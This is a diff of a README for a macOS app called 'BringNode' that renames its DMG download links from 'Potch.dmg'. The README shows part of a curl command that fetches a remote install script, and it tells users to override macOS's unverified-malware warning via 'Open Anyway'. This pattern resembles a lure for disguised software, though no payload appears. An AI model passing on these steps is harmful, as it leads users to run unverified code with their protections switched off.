@@ -10,7 +10,7 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/izyouna/BringNode.update/raw/main/Potch.dmg">
+  <a href="https://github.com/izyouna/BringNode.update/raw/main/BringNode.dmg">
     <img src="https://img.shields.io/badge/Download-BringNode.dmg-black?style=for-the-badge&logo=apple" alt="Download BringNode DMG" />
   </a>
 </p>
@@ -42,10 +42,10 @@ curl -fsSL https://raw.githubusercontent.com/izyouna/BringNode.update/main/insta
 
 | Format | Download Link | Size | Description |
 | :--- | :--- | :--- | :--- |
-| **Apple Disk Image** | [**📥 Download BringNode.dmg**](https://github.com/izyouna/BringNode.update/raw/main/Potch.dmg) | ~15 MB | Standard macOS disk installer with drag-to-Applications |
+| **Apple Disk Image** | [**📥 Download BringNode.dmg**](https://github.com/izyouna/BringNode.update/raw/main/BringNode.dmg) | ~15 MB | Standard macOS disk installer with drag-to-Applications |
 
 #### Installation Steps:
-1. Download [**`BringNode.dmg`**](https://github.com/izyouna/BringNode.update/raw/main/Potch.dmg) and open it.
+1. Download [**`BringNode.dmg`**](https://github.com/izyouna/BringNode.update/raw/main/BringNode.dmg) and open it.
 2. Drag **`BringNode`** into your **`Applications`** folder.
 3. Open BringNode. If macOS displays *"Apple could not verify “BringNode” is free of malware..."*:
    - **Method A (System Settings — No Terminal):** Go to **System Settings** > **Privacy & Security**, scroll down to **Security**, and click **"Open Anyway"**.
